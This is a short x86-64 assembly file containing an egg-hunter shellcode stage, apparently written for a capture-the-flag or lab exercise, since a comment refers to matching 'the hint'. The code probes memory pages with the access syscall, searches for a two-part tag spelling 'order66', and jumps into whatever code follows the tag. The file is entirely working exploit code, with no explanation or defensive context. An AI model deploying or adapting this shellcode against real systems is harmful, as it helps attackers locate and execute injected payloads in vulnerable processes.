bits 64

section .text
global _start

    xor rsi, rsi
    mov rdi, rsi;0
    mov rdi, 0x700000000000 ;Must change this addr to macth with the hint
    egg1 equ 0x6564726f
    egg2 equ 0x00363672

goto_next_page :
    or di,0xfff
    inc rdi

next_addr :
    push 0x15
    pop rax
    syscall
    cmp al,0xf2
    jz goto_next_page
    mov eax, egg1
    scasd
    jnz next_addr
    mov eax, egg2
    scasd
    jnz next_addr
    call rdi
